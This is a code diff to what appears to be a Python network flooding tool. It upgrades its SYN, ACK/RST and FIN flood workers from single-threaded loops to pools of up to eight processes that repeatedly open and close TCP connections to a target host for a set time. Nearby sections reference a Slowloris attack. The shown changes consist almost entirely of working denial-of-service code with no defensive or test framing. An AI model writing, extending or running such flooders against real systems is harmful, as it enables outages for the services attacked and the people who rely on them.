@@ -25,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "3.14"
+VERSION = "3.15"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -647,28 +647,77 @@ async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
     stats.conns += n_procs
 
 # ── SYN flood: connect only, never read ──────────────────────────
+def _mp_syn_flood(args_tuple):
+    """Multi-process SYN flooder: connect only (SYN)."""
+    host, port, duration = args_tuple
+    import time as _time
+    conns = 0
+    errors = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            s.connect((host, port))
+            s.close()
+            conns += 1
+        except Exception:
+            errors += 1
+    return conns, errors
+
 async def syn_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
-    loop = asyncio.get_event_loop()
-    while not stop.is_set():
-        try:
-            s = await loop.run_in_executor(None, _open_fin_sock, host, port)
-            stats.conns += 1
-            s.close()
-        except Exception:
-            stats.errors += 1
+    n_procs = max(1, min(8, _UDP_NPROCS[0]))
+    
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, duration)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_syn_flood, targets)
+    
+    results = await _wait_pool(pool, async_result, duration + 5)
+    if results is None:
+        results = [(0, 0)] * n_procs
+    for conns, errs in results:
+        stats.conns += conns
+        stats.errors += errs
 
 # ── SYN-ACK / connect+close (ACK flood) ──────────────────────────
+def _mp_synack_flood(args_tuple):
+    """Multi-process SYNACK/RST flooder."""
+    host, port, duration = args_tuple
+    import time as _time
+    conns = 0
+    errors = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            s.connect((host, port))
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+            s.close()  # RST
+            conns += 1
+        except Exception:
+            errors += 1
+    return conns, errors
+
 async def synack_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
-    loop = asyncio.get_event_loop()
-    while not stop.is_set():
-        try:
-            s = await loop.run_in_executor(None, _open_rst_sock, host, port)
-            stats.conns += 1
-            s.close()  # SO_LINGER(0,0) → RST
-        except Exception:
-            stats.errors += 1
+    n_procs = max(1, min(8, _UDP_NPROCS[0]))
+    
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, duration)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_synack_flood, targets)
+    
+    results = await _wait_pool(pool, async_result, duration + 5)
+    if results is None:
+        results = [(0, 0)] * n_procs
+    for conns, errs in results:
+        stats.conns += conns
+        stats.errors += errs
 
 # ── RST flood: SO_LINGER(0,0) close sends RST ───────────────────
 def _open_rst_sock(host, port):
@@ -723,16 +772,40 @@ def _open_fin_sock(host, port):
     s.connect((host, port))
     return s
 
+def _mp_fin_flood(args_tuple):
+    """Multi-process FIN flooder: connect, graceful close (FIN)."""
+    host, port, duration = args_tuple
+    import time as _time
+    conns = 0
+    errors = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2.0)
+            s.connect((host, port))
+            s.close()  # graceful → FIN
+            conns += 1
+        except Exception:
+            errors += 1
+    return conns, errors
+
 async def fin_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
-    loop = asyncio.get_event_loop()
-    while not stop.is_set():
-        try:
-            s = await loop.run_in_executor(None, _open_fin_sock, host, port)
-            stats.conns += 1
-            s.close()  # graceful → FIN
-        except Exception:
-            stats.errors += 1
+    n_procs = max(1, min(8, _UDP_NPROCS[0]))
+    
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, duration)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_fin_flood, targets)
+    
+    results = await _wait_pool(pool, async_result, duration + 5)
+    if results is None:
+        results = [(0, 0)] * n_procs
+    for conns, errs in results:
+        stats.conns += conns
+        stats.errors += errs
 
 # ── Slowloris: open connection, send partial headers slowly ──────
 async def slowloris_worker(name, url, stats, duration, stop, payload_size=0):
